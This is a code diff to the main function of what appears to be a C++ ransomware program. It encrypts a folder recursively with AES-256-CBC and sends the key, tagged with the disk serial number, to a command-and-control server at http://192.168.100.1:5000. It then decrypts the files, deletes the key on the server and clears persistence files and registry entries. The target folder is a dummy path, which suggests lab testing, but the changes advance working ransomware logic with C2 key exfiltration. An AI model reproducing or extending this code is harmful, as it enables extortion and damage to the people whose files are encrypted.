@@ -60,13 +60,15 @@ int main(int argc, char* argv[]) {
     // { ENCRYPTION } //
 
     std::string enc_path;
+    std::string diskSerial = persistence::getDiskSerial();
     enc_path = "C:\\dummy\\";
     
     std::cout << "[i] Working within  " << enc_path << ".\n";
     AES256CBC AES;
+    AES.C2Addr = "http://192.168.100.1:5000";
 
     AES.generateKey();
-    AES.keyToC2(hwid);
+    AES.keyToC2(diskSerial);
     AES.encryptRecursively(enc_path);
 
     // { END ENCRYPTION } //
@@ -77,8 +79,9 @@ int main(int argc, char* argv[]) {
         Sleep(5000); // Пауза 5 секунд перед следующей проверкой
     }
 
-    //AES.keyFromC2(hwid);
+    //AES.keyFromC2(persistence::getDiskSerial());
     AES.decryptRecursively(enc_path);
+    cpr::Delete(AES.C2Addr + "/DeleteKey", cpr::Body{"HDID=" + diskSerial});
 
     persistence::cleanfile();
     persistence::cleanreg();
